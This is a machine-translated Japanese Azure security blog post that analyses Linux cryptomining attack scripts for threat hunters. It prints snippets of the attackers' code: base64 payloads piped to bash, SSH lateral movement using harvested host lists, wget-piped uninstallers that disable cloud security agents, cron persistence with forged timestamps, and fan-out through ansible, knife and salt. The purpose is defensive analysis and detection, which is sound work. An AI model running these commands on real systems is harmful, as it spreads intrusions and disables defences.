### YamlMime:Yaml
ms.openlocfilehash: 5b8ce55fa34300dca6b6ecd967d9aad2b37a8514
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/11/2022
ms.locfileid: "139896720"
Slug: learning-from-cryptocurrency-mining-attack-scripts-on-linux
Title: ラーニング Linux での暗号化マイニング攻撃スクリプトからのアクセス
Summary: 暗号化マイニング攻撃は、多くの Azure Linux 顧客に対する脅威を引き続き表しています。
Content: >-
  <p>暗号化マイニング攻撃は、多くの Azure Linux 顧客に対する脅威を引き続き表しています。 <a href="https://azure.microsoft.com/en-us/blog/leverage-azure-security-center-to-detect-when-compromised-linux-machines-attack/">以前は、</a>一部&#39;ブルート フォース手法を使用してアカウント名とパスワードを推測し、それを使用してマシンにアクセスする方法について説明しました。 現在、&#39;、サービスをホストしているマシンで攻撃者コードを直接実行するためにサービスが悪用される場所を、お客様の一部のお客様が見てきた攻撃について話し合っています。</p>


  <p>この攻撃は、いくつかの理由で興味深いものです。 攻撃者はスクリプトをエコーして、マシン上で実行される操作ではなく、実行する操作を確認できます。 スクリプトでは、キャンペーンの到達距離を示す、利用できるさまざまなサービスが含まれています。 最後に、スクリプト自体が用意されているので、 <a href="https://attack.mitre.org/matrices/enterprise/linux/" target="_blank">Linux MITRE ATTCK&amp; マトリックス</a> の横移動、防御回避、永続化、および目標に関するセクションから優れた例を引き出し、それを使用して独自のデータでのハンティングについて説明することができます。</p>


  <h2>初期ベクター</h2>


  <p>この攻撃では、監査されたログで何かが間違っているという最初の兆候は、base64 でエンコードされたコマンドを base64 にパイプしてデコードし、bash にパイプするエコー コマンドです。 ユーザー全体で、この最初のコマンドはインターネットに公開されるアプリケーションまたはサービスの親プロセスを持ち、そのプロセスに関連付けられているユーザー アカウントによってコマンドが実行されます。 これは、コマンドを実行するためにアプリケーションまたはサービス自体が悪用されたかどうかを示します。 これらのアカウントの一部は顧客に固有ですが、Ubuntu、Jenkins、Hadoop のような一般的なアカウントも使用されています。&nbsp;</p>


  <p><code>/bin/sh -c &quot;echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYm</code></p>


  <p><code>luOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4K&lt;snip&gt;CmRvbm</code></p>


  <p><code>UK|base64 -d|bash&quot;</code></p>


  <h2>スクリプト</h2>


  <p>この攻撃者がスクリプトを使用する方法について少し説明する価値があります。 この場合、base64 でエンコードされたスクリプトを使用して、ほぼすべてを実行します。 <code>/dev/null</code>これらのスクリプトに関する興味深い点の 1 つは、同じ最初の 2 行から始まる点です。標準エラーと標準出力ストリームの両方を にリダイレクトし、パス変数を攻撃者が通常、実行するシステム コマンドを保持している場所に設定します。&nbsp;</p>


  <p><code>exec &amp;&gt;/dev/null<br>

  export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</code></p>


  <p>これは、それぞれが base64 でエンコードされている場合、エンコードの最初の部分が毎回同じことを示します。</p>


  <p><code>ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYm</code></p>


  <p><code>luOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4K</code></p>


  <p>同じコマンドを使用すると、大規模なマシン セット間で攻撃を結び付けようとするときに特に役立ちます。 スクリプト自体も興味深いものです。攻撃者が実行する意図を確認できるからです。 防御者は、可能な限り攻撃者のスクリプトを見て、システムを操作しようとしている方法を確認できると非常に重要な場合があります。 たとえば、この攻撃者は for ループを使用して、考えられるさまざまなドメイン名を繰り返します。 この種の分析情報により、調査中にピボットするデータが多く Defender に提供されます。</p>


  <p><code>for h in onion.glass civiclink.network tor2web.io onion.sh onion.mn onion.in.net onion.to<br>

  do<br>

  if ! ls /proc/$(cat /tmp/.X11-unix/01)/io; then<br>

  x t&lt;snip&gt;v.$h<br>

  else<br>

  break<br>

  fi<br>

  done</code></p>


  <p>この攻撃者が、多数の顧客にわたって 30 を超える異なるエンコードされたスクリプトを使用しているのを確認しましたが、実行可能ファイル名やダウンロード サイトに小さな違いがある約 12 個の基本的なスクリプトにまで下がっています。 これらのスクリプト内には、MITRE ATTCK&amp; Matrix for Linux に直接結び付けできる興味深い例がいくつか含まれています。</p>


  <h2>侵入の拡大</h2>


  <p>攻撃者が最初&rsquo;に行うのは、興味深い組み合わせ検出 (<a href="https://attack.mitre.org/techniques/T1018/">T1018: リモート</a> システム検出) と横移動 (<a href="https://attack.mitre.org/techniques/T1021/">T1021: リモート</a> サービス) の手法を使用して、他のホストに感染します。 ファイル を取得し、<code>.bash_history, /etc/hosts</code><code>.ssh/known_hosts</code>IP アドレスを探します。 その後、ルート アカウントと、パスワードなしで現在のホストで侵害したアカウントの両方を使用して、最初にエンコードされたスクリプトを各ホストに渡します。 関数は、元 <code>xssh</code> のスクリプトの呼び出しの前に表示されます。&nbsp;</p>


  <p><code>hosts=$(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; ~/.bash_history /etc/hosts ~/.ssh/known_hosts |awk -F: {&#39;print $2&#39;}|sort|uniq ;awk {&#39;print $1&#39;} $HOME/.ssh/known_hosts|sort|uniq|grep -v =|sort|uniq)<br>

  for h in $hosts;do xssh root $h; xssh $USER $h &amp; done<br>

  ------<br>

  xssh() {<br>

  ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no $1@$2 &#39;echo ZXhlYyA&lt;snip&gt;KZG9uZQo=|base64 -d|bash&#39;<br>

  }</code></p>


  <p>各ケースでは、最初の足がかりを獲得した後、攻撃者は同様の一連の防御回避手法を使用します。</p>


  <h2>防御回避</h2>


  <p>攻撃者は、さまざまなスクリプトで <a href="https://attack.mitre.org/techniques/T1107/">、T1107:ファイル</a>の削除、 <a href="https://attack.mitre.org/techniques/T1222/">T1222:</a>ファイルとディレクトリのアクセス許可の変更、 <a href="https://attack.mitre.org/techniques/T1089/">T1089:</a> セキュリティ ツールの手法の無効化、およびこの時点で明らかな <a href="https://attack.mitre.org/techniques/T1064/">T1064: スクリプト</a>を使用します。</p>


  <p>1 つのスクリプトで、最初にランダムな名前のファイルを作成します。</p>


  <p><code>z=./$(date|md5sum|cut -f1 -d&quot; &quot;)</code></p>


  <p>実行可能ファイルをそのファイルにダウンロードした後、ダウンロードしたファイルを変更して実行し、ディスクからファイルを削除します。</p>


  <p><code>chmod +x $z;$z;rm -f</code></p>


  <p>別のスクリプトでは、攻撃者は Alibaba Cloud Security Server Guard と AliCloud CloudMonitor サービスのアンインストール ファイルをダウンロードして実行します (変数 $w は、スクリプトの前の方で wget コマンドとして設定されています)。</p>


  <p><code>$w update.aegis.aliyun.com/download/uninstall.sh|bash<br>

  $w update.aegis.aliyun.com/download/quartz_uninstall.sh|bash<br>

  /usr/local/qcloud/stargate/admin/uninstall.sh</code></p>


  <h2>永続化</h2>


  <p>コイン マイナーが稼働すると、この攻撃者は <a href="https://attack.mitre.org/techniques/T1168/">T1168:</a> ローカル ジョブ スケジュールと <a href="https://attack.mitre.org/techniques/T1501/">T1501: システム</a> サービスのスケジュールされたタスクの組み合わせを使用して永続化します。 以下は、ntp 呼び出しと base64 でエンコードされたスクリプトの 1 つをファイル systemd-ntpdate にエコーし、そのファイルを実行する cron ジョブを追加するスクリプトの別の部分から取得されます。 ここでエンコードされたスクリプトは、基本的に侵入を開始した元のスクリプトと同じです。</p>


  <p><code>echo -e &quot;#\x21/bin/bash\nexec &amp;&gt;/dev/null\nntpdate ntp.aliyun.com\nsleep $((RANDOM % 600))\necho ZXhlYyAmPi9&lt;snip&gt;2gKZmkK|base64 -d|bash&quot; &gt; /lib/systemd/systemd-ntpdate<br>

  echo &quot;0 * * * * root /lib/systemd/systemd-ntpdate&quot; &gt; /etc/cron.d/0systemd-ntpdate<br>

  touch -r /bin/grep /lib/systemd/systemd-ntpdate<br>

  touch -r /bin/grep /etc/cron.d/0systemd-ntpdate<br>

  chmod +x /lib/systemd/systemd-ntpdate</code></p>


  <h2>目標</h2>


  <p>前述のように、この攻撃者の主な目的は、コイン マイナーを開始する方法です。 これは、 <a href="https://attack.mitre.org/techniques/T1496/">T1496:</a> リソース ハイジャック戦術を使用して実行される最初のスクリプトで行います。 この攻撃に関する興味深い点の 1 つは、最初に侵害されたアカウントでコイン マイナーを取得しようとして開始する一方で、後続のスクリプトの 1 つは、さまざまなソフトウェア (<a href="https://attack.mitre.org/techniques/T1072/">T1072:</a> サード パーティ 製ソフトウェア) のコマンドの使用を開始しようとする点です。</p>


  <p><code>ansible all -m shell -a &#39;echo ZXh&lt;snip&gt;uZQo=|base64 -d|bash&#39;<br>

  knife ssh &#39;name:*&#39; &#39;echo ZXh&lt;snip&gt;uZQo=|base64 -d|bash&#39;<br>

  salt &#39;*&#39; cmd.run &#39;echo ZXh&lt;snip&gt;ZQo=|base64 -d|bash&#39;</code></p>


  <h2>検出</h2>


  <p>ASC Linux のお客様は、この<a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-detect-attacks-against-your-linux-machines/"></a>種類のアクティビティからコイン マイニングまたは疑わしいダウンロード アラートが表示される必要がありますが、自分で探す場合はどうしますか? 上記のスクリプト例を使用する場合は、特にコマンド ライン ログがある場合に、フォローアップできるインジケーターがいくつかあります。&nbsp;</p>


  <ul>
      <li>オニオンサイトと Tor サイトへの予期しない接続が表示されますか?</li>
      <li>ホスト間に予期しない SSH 接続が表示されますか?</li>
      <li>特定のユーザーからのアクティビティが増加していますか?</li>
      <li>base64 コマンドがエコーされ、デコードされた後、bash にパイプ処理されているのが表示されますか? ご自身のネットワークによっては、疑わしい可能性があります。</li>
      <li>cron ジョブを確認してください。wgets または base64 でエンコードされた行が表示されますか?</li>
      <li>マシンで実行されているサービスを確認してください。予期しない何かが表示されますか?</li>
      <li>上記の Objectives セクションを参照すると、インストールされていないソフトウェアのコマンドが&rsquo;表示されますか?</li>
  </ul>


  <p>Azure Sentinelハンティング <a href="https://docs.microsoft.com/en-us/azure/sentinel/hunting" target="_blank">にも役立ちます</a> 。 お客様が既にAzure Security Center場合は、お客様の顧客に簡単 <a href="https://techcommunity.microsoft.com/t5/azure-sentinel/integrating-azure-security-center-with-azure-sentinel/ba-p/482847" target="_blank">に統合Azure Sentinel</a> 。</p>


  <h2>防衛</h2>


  <p>ハンティングに加えて、これらの種類の攻撃から身を守るために実行できるいくつかの操作があります。 インターネットに接続するサービスがある場合は、それらを最新の状態に<a href="https://docs.microsoft.com/en-us/azure/automation/automation-tutorial-update-management"></a>保ち、既定のパスワードを変更し、<a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-just-in-time">Just-In-Time (JIT)</a>、パスワードレス サインイン、<a href="https://docs.microsoft.com/en-us/azure/key-vault/key-vault-whatis">Azure Key Vault</a> など、Azure が提供する他の資格情報管理<a href="https://techcommunity.microsoft.com/t5/Azure-Active-Directory-Identity/Announcing-password-less-login-identity-governance-and-more-for/ba-p/262472"></a>ツールの一部を利用してください。 Azure マシンの使用率を監視する。予期しない使用量の増加は、コイン マイナーを示している可能性があります。 その他のアイデアについては、Azure Security Center <a href="https://docs.microsoft.com/en-us/azure/security-center/" target="_blank">をご覧ください</a>。&nbsp;</p>


  <h2>Linux システムに対する攻撃の特定</h2>


  <p>コイン マイナーは、インターネットに公開されているマシンに対する脅威を引き続き表します。 通常&#39;の IP をブロックしたり、署名ベースのウイルス対策を使用したりするのは簡単ですが、攻撃者の戦術、手法、手順を調査することで、防御者は環境を保護するための新しい信頼性の高い方法を見つける可能性があります。</p>


  <p>この投稿では特定のコイン マイナー攻撃者について説明しますが、上で強調した基本的な手法は、Linux システムの多くの異なる種類の攻撃者によって使用されています。 横移動、防御回避、永続化の手法は、異なる攻撃者によって定期的に使用される上記と同様であり、調査に基づいて新しい検出を継続的に追加しています。</p>
